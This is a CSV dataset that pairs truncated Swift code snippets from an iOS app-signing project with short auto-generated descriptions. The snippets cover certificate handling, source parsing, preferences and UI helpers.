id,language,folder,code_type,file_path,nl,code
84,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift","Function fetchChatHistory - implements fetchchathistory functionality","func fetchChatHistory(for session: ChatSession) -> [ChatMessage] {
do {"
85,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift","Function getDatedCertificate - retrieves datedcertificate","func getDatedCertificate() -> [Certificate] {
do {"
86,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift","Function getCurrentCertificate - retrieves currentcertificate","func getCurrentCertificate() -> Certificate? {
let certificates = getDatedCertificate()
let selectedIndex = Preferences.selectedCert // This is already a non-optional Int with default value 0
guard selectedIndex >= 0, selectedIndex < certificates.count else { return nil }"
87,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift","Function getFilesForDownloadedApps - retrieves filesfordownloadedapps","func getFilesForDownloadedApps(for app: DownloadedApps, getuuidonly: Bool) throws -> URL {
// Safely unwrap the documents directory
guard let documentsDirectory = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first
else {"
88,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift","Helper method to get files path from app with valid UUID","private func getFilesPathFromUUID(_ app: DownloadedApps, getuuidonly: Bool, documentsDirectory: URL) throws -> URL {
guard let uuid = app.uuid else {"
89,swift,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift","Error type for background task operations","struct BackgroundTaskError: Error {
let underlyingError: Error
}

extension NSPersistentContainer {"
90,swift,Shared,extension,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift","extension NSPersistentContainer - implements functionality related to n s persistent container","extension NSPersistentContainer {
// Use regular throws instead of rethrows and explicitly specify error handling
func performBackgroundTask<T>(_ block: @escaping (NSManagedObjectContext) throws -> T) async throws -> T {"
91,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/CoreDataManager.swift","Use regular throws instead of rethrows and explicitly specify error handling","func performBackgroundTask<T>(_ block: @escaping (NSManagedObjectContext) throws -> T) async throws -> T {
do {"
92,swift,Shared,class,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Download/Sources.swift","class SourceGET - implements functionality related to source g e t","class SourceGET {
// Private session with configuration
private let session: URLSession

init(timeoutInterval: TimeInterval = 30.0, cachePolicy: URLRequest.CachePolicy = .useProtocolCachePolicy) {"
93,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Download/Sources.swift","Function downloadURL - implements downloadurl functionality","func downloadURL(from url: URL, completion: @escaping (Result<(Data, HTTPURLResponse?), Error>) -> Void) {
let task = session.dataTask(with: url) { data, response, error in"
94,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Download/Sources.swift","/ Generic parsing method for any Decodable type","func parseJSON<T: Decodable>(data: Data) -> Result<T, Error> {
do {"
95,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Download/Sources.swift","Function parse - implements parse functionality","func parse(data: Data) -> Result<SourcesData, Error> {
return parseJSON(data: data)
}

func parseCert(data: Data) -> Result<ServerPack, Error> {"
96,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Download/Sources.swift","Function parseCert - implements parsecert functionality","func parseCert(data: Data) -> Result<ServerPack, Error> {
return parseJSON(data: data)
}

func parsec(data: Data) -> Result<[CreditsPerson], Error> {"
97,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Download/Sources.swift","Function parsec - implements parsec functionality","func parsec(data: Data) -> Result<[CreditsPerson], Error> {
return parseJSON(data: data)
}
}
"
98,swift,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Models/CertificateModel.swift","MARK: - Certificate (Mobileprovision file)","public struct Cert: Codable {
public var AppIDName: String
public var CreationDate: Date
public var IsXcodeManaged: Bool
public var derEncodedProfile: Data
public var PPQCheck: Bool?
public var ExpirationDate: Date
public var Name: String
public var TeamName: String
public var TimeToLive: Int"
99,swift,Shared,enum,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Models/CertificateModel.swift","enum CodingKeys - implements functionality related to coding keys","enum CodingKeys: String, CodingKey {
case AppIDName,
CreationDate,
IsXcodeManaged,
PPQCheck,
ExpirationDate,
Name,
TeamName,
TimeToLive,
UUID,"
100,swift,Shared,enum,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Models/FileProcessingError.swift","/ Shared error type to use across file processing operations","enum FileProcessingError: Error, LocalizedError {
case missingFile(String)
case fileIOError(Error)
case invalidPath
case unsupportedFileExtension(String)
case decompressionFailed(String)

var errorDescription: String? {"
101,swift,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Models/SourcesModel.swift","MARK: - Sources","public struct SourcesData: Codable, Hashable {
public var name: String?
public var identifier: String
public var tintColor: String?

public var sourceURL: URL?
public var iconURL: URL?
public var website: String?
public var news: [NewsData]?
public var apps: [StoreAppsData]"
102,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Models/SourcesModel.swift","Function hash - checks if it has h","public func hash(into hasher: inout Hasher) {
hasher.combine(identifier)
}
}

public struct NewsData: Codable, Hashable {"
103,swift,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Models/SourcesModel.swift","struct NewsData - implements functionality related to news data","public struct NewsData: Codable, Hashable {
public let title: String?
public let identifier: String
public let caption: String?
public let tintColor: String?
public let imageURL: String?
public let url: URL?
public let date: String
public let appID: String?
}"
104,swift,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Models/SourcesModel.swift","struct StoreAppsData - implements functionality related to store apps data","public struct StoreAppsData: Codable {
public var name: String
public var developerName: String?
public var subtitle: String?
public var bundleIdentifier: String

public var iconURL: URL?
public var downloadURL: URL?
public var size: Int?
public var screenshotURLs: [URL]?"
105,swift,Shared,enum,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Models/SourcesModel.swift","enum CodingKeys - implements functionality related to coding keys","enum CodingKeys: String, CodingKey {
case name, developerName, subtitle, bundleIdentifier
case iconURL, downloadURL, size
case screenshotURLs, screenshots
case version, versions, versionDate, versionDescription, localizedDescription
}

public init(from decoder: Decoder) throws {"
106,swift,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Models/SourcesModel.swift","struct Screenshot - implements functionality related to screenshot","public struct Screenshot: Codable {
public var imageURL: URL
public var width: Int?
public var height: Int?

public init(imageURL: URL, width: Int? = nil, height: Int? = nil) {"
107,swift,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Models/SourcesModel.swift","struct StoreAppsDataVersion - implements functionality related to store apps data version","public struct StoreAppsDataVersion: Codable {
public var version: String
public var localizedDescription: String?
public var downloadURL: URL
public var size: Int?
public var date: String?
}
"
108,swift,Shared,enum,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/CoreData/Models/TerminalFileError.swift","/ File operation errors specific to terminal file operations","enum TerminalFileError: Error {
case invalidURL
case noData
case invalidResponse
case apiError(String)
case sessionError(String)
case parseError(String)
case fileNotFound(String)
case unknownError(String)
case failure(String)"
109,swift,Shared,enum,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/UserDefaults/Preferences.swift","enum Preferences - implements functionality related to preferences","enum Preferences {
static var installPathChangedCallback: ((String?) -> Void)?
static let defaultInstallPath: String = ""https://api.palera.in""

@Storage(key: ""Backdoor.UserSpecifiedOnlinePath"", defaultValue: defaultInstallPath)
static var onlinePath: String? { didSet { installPathChangedCallback?(onlinePath) } }"
110,swift,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/UserDefaults/Preferences.swift","New SigningOptions struct and property","struct SigningOptions: CustomStringConvertible {
let selectedCertificateIndex: Int
let useAppIDtoTeamID: Bool

var description: String {"
111,swift,Shared,extension,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/UserDefaults/Preferences.swift","MARK: - Callbacks","private extension Preferences {
static func preferredLangChangedCallback(newValue: String?) {"
112,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/UserDefaults/Preferences.swift","Function preferredLangChangedCallback - implements preferredlangchangedcallback functionality","static func preferredLangChangedCallback(newValue: String?) {
Bundle.preferredLocalizationBundle = .makeLocalizationBundle(preferredLanguageCode: newValue)
}
}

// MARK: - Color

struct CodableColor: Codable {"
113,swift,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/UserDefaults/Preferences.swift","MARK: - Color","struct CodableColor: Codable {
let red: CGFloat
let green: CGFloat
let blue: CGFloat
let alpha: CGFloat

var uiColor: UIColor {"
114,swift,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/UserDefaults/Storage.swift","struct Storage - implements functionality related to storage","struct Storage<Value> {
typealias Callback = (Value) -> Void
let key: String
let defaultValue: Value
let callback: Callback?

init(key: String, defaultValue: Value, callback: Callback? = nil) {"
115,swift,Shared,struct,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Data/UserDefaults/Storage.swift","struct CodableStorage - implements functionality related to codable storage","public struct CodableStorage<Value: Codable> {
public typealias Handler = (String, Value) -> Void

var key: String
var defaultValue: Value
var handler: Handler?

public init(key: String, defaultValue: Value, handler: Handler? = nil) {"
116,swift,Shared,enum,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/FloatingActionButton.swift","/ Constants used by the FloatingActionButton","private enum FloatingActionButtonConstants {
/// Default appearance values
enum Defaults {"
117,swift,Shared,enum,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/FloatingActionButton.swift","/ Default appearance values","enum Defaults {
/// Default title for the button
static let title = ""+""
/// Default system image name for the button
static let systemImageName = ""folder.fill""
/// Default font size
static let fontSize: CGFloat = 20
/// Default shadow opacity
static let shadowOpacity: Float = 0.1
/// Default shadow radius"
118,swift,Shared,enum,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/FloatingActionButton.swift","/ Fallback colors","enum Colors {
/// Fallback background color if named color isn't found
static let fallbackBackground = UIColor.secondarySystemBackground
}
}

/// Creates a floating action button with customizable appearance
///
/// - Parameters:
///   - title: The text to display on the button (default: ""+"")"
119,swift,Shared,function,"/workspace/build-it-test-it_Backdoor-Signer/Shared/Design/FloatingActionButton.swift","/ Creates a floating action button with customizable appearance / / - Parameters: /   - title: The text to display on the button (default: ""+"") /   - image: Optional image to display instead of text /   - titleColor: The color of the button title /   - backgroundColor: The background color of the button /   - font: The font to use for the button title /   - shadowOpacity: The opacity of the button's shadow /   - shadowRadius: The radius of the button's shadow /   - shadowOffset: The offset of the button's shadow /   - cornerRadius: The corner radius of the button /   - cornerCurve: The corner curve style of the button / - Returns: A configured UIButton instance","func createFloatingActionButton(
title: String? = FloatingActionButtonConstants.Defaults.title,
image: UIImage? = nil,
titleColor: UIColor = Preferences.appTintColor.uiColor,
backgroundColor: UIColor? = nil,
font: UIFont = UIFont.systemFont(ofSize: FloatingActionButtonConstants.Defaults.fontSize),
shadowOpacity: Float = FloatingActionButtonConstants.Defaults.shadowOpacity,
shadowRadius: CGFloat = FloatingActionButtonConstants.Defaults.shadowRadius,
shadowOffset: CGSize = FloatingActionButtonConstants.Defaults.shadowOffset,
cornerRadius: CGFloat = FloatingActionButtonConstants.Defaults.cornerRadius,
cornerCurve: CALayerCornerCurve = FloatingActionButtonConstants.Defaults.cornerCurve
) -> UIButton {"
